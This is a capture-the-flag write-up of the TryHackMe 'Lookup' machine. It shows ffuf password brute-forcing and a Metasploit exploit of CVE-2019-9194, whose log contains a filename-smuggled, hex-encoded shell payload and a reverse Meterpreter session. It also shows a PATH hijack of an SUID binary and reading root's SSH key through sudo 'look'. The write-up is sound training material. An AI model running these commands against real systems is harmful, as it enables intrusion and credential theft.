---
title: "TryHackMe - Lookup"
author: Nasrallah
description: ""
date: 2024-12-01 12:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, cve, metasploit, sudo, ghidra, suid, path-hijack]
img_path: /assets/img/tryhackme/lookup
image:
    path: lookup.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Lookup](https://tryhackme.comr/r/room/lookup) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) start with a credential brute force of a website, when the correct creds found we get redirected to a subdomain running an application vulnerable to command injection, we use a module from metasploit to get foothold. After that we exploit an SUID binary with Path hijacking to get a password of a user. With the new user we found a sudo entry that allows us to read files on system so we get root ssh private key and get a root shell.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.59.242
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found ssh on port 80 and an apache web server on port 80.

### Web

From nmap we see that the hostname `lookup.thm`, let's add it to `/etc/hosts` file and navigate to the web page.

![loing](1.png)

We found a login page, trying with `test:test` it gives us `wrong username or password`

![userpass](2.png)

But with user admin we only get `wrong password`

![admin](3.png)

Let's brute force the password.

```terminal
[★]$ ffuf -c -w /usr/share/wordlists/fasttrack.txt -u http://lookup.thm/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=FUZZ' -fw 8    
                                                                                                                                                                                              
        /'___\  /'___\           /'___\                                                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                       
                                                                                                                                                                                              
       v2.1.0-dev                                                                                                                                                                             
________________________________________________                                                                                                                                              
                                                                                                                                                                                              
 :: Method           : POST                                                                                                                                                                   
 :: URL              : http://lookup.thm/login.php                                                                                                                                            
 :: Wordlist         : FUZZ: /usr/share/wordlists/fasttrack.txt                                                                                                                               
 :: Header           : Content-Type: application/x-www-form-urlencoded                                                                                                                        
 :: Data             : username=admin&password=FUZZ                                                                                                                                           
 :: Follow redirects : false                                                                                                                                                                  
 :: Calibration      : false                                                                                                                                                                  
 :: Timeout          : 10                                                                                                                                                                     
 :: Threads          : 40                                                                                                                                                                     
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                                                                                                                   
 :: Filter           : Response words: 8                                                                                                                                                      
________________________________________________                                                                                                                                              
                                                                                                                                                                                              
password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 940ms]                                                                                                         
:: Progress: [222/222] :: Job [1/1] :: 35 req/sec :: Duration: [0:00:07] :: Errors: 0 ::           

```

We found the password, but trying to log in with it still gives `wrong username or password`.

Let's try enumerating another user.

```terminal
[★]$ ffuf -c -w /usr/share/seclists/Usernames/Names/names.txt -u http://lookup.thm/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=FUZZ&password=passw
ord123' -fw 10                                                                                                                                                                                
                                                                                                                                                                                              
        /'___\  /'___\           /'___\                                                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                       
                                                                                                                                                                                              
       v2.1.0-dev                                                                                                                                                                             
________________________________________________                                                                                                                                              
                                                                                                                                                                                              
 :: Method           : POST                                                                                                                                                                   
 :: URL              : http://lookup.thm/login.php                                                                                                                                            
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt                                                                                                                    
 :: Header           : Content-Type: application/x-www-form-urlencoded                                                                                                                        
 :: Data             : username=FUZZ&password=password123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10
________________________________________________

jose                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 175ms]
```

We found `jose` and we success to log in.

We got redirected to `files.lookup.thm`, we add that to `/etc/hosts` again and login again.

![files](4.png)

Cliking the `i` icon gives us the version.

![version](5.png)

A quick search on google we find it has a command injection in php connector [CVE-2019-9194](https://nvd.nist.gov/vuln/detail/CVE-2019-9194).

## **Foothold**

We can use the metasploit module `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`

```terminal
[msf](Jobs:0 Agents:0) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> set rhosts 10.10.85.166
rhosts => 10.10.85.166
[msf](Jobs:0 Agents:0) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> set vhost files.lookup.thm
vhost => files.lookup.thm
[msf](Jobs:0 Agents:0) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) >> run

[*] Started reverse TCP handler on 10.8.81.165:4444 
[*] Uploading payload 'kb9UJaZY.jpg;echo 6370202e2e2f66696c65732f6b6239554a615a592e6a70672a6563686f2a202e5250704c5038436e682e706870 |xxd -r -p |sh& #.jpg' (1944 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.RPpLP8Cnh.php) ...
[*] Sending stage (39927 bytes) to 10.10.85.166
[+] Deleted .RPpLP8Cnh.php
[*] Meterpreter session 2 opened (10.8.81.165:4444 -> 10.10.85.166:48582) at 2024-11-29 11:01:07 +0100
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

(Meterpreter 2)(/var/www/files.lookup.thm/public_html/elFinder/php) >
```

## **Privilege Escalation**

Running linpeas we find an SUID binary.

```terminal
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```

Running the binary reveals that it runs the command `id`, extract the username and trying to grab a file called `.passwords` from that user's home directory.

```terminal
www-data@lookup:/$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

There is a `.password` file on user `think` home directory so that is our target.

![ghidra](6.png)

Analyzing the file with `ghidra` we see it's running `id` without a full path and it's printing the content of `.passwords`.

We can do a path hijacking attack of the command id to read the `.passwords` file of user think.

First we need to get the `id` of the user.

```bash
id think
uid=1000(think) gid=1000(think) groups=1000(think)
```

Now I'll create a id file in `/tmp` that prints out the `id` of user `think`.

```bash
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id
chmod +x /tmp/id
```

Now we add `/tmp` to PATH variable.

```bash
export PATH=/tmp:$PATH
```

Now we run the `/usr/sbin/pwm`.

```terminal
www-data@lookup:/$ /usr/sbin/pwm                                                                
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004  
jose1002
jose1001teles
[...]
```

We got the content of the passwords file, and looking through the passwords one sticks out as `think`'s password and we manage to switch to that user.

```terminal
www-data@lookup:/$ su think
Password: 
think@lookup:/$
```

### think -> root

Checking our privileges as `think` we see that we can run look as root

```terminal
think@lookup:/$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

A quick look at [GTFOBins](https://gtfobins.github.io/gtfobins/look/#sudo) we find how to read any file.

We can use that to read the root's private ssh key.

```bash
sudo /usr/bin/look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
[...]
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

We copy the key to our machine, give it 600 permissions and connect with it.

```terminal
┌──[10.8.81.165]─[sirius💀parrot]-[~/ctf/thm/lookup]
└──╼[★]$ vim id_rsa   

┌──[10.8.81.165]─[sirius💀parrot]-[~/ctf/thm/lookup]
└──╼[★]$ chmod 600 id_rsa    

┌──[10.8.81.165]─[sirius💀parrot]-[~/ctf/thm/lookup]
└──╼[★]$ ssh -i id_rsa root@lookup.thm
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
[...]
Last login: Mon May 13 10:00:24 2024 from 192.168.14.1
root@lookup:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://nvd.nist.gov/vuln/detail/CVE-2019-9194>

<https://gtfobins.github.io/gtfobins/look/#sudo>
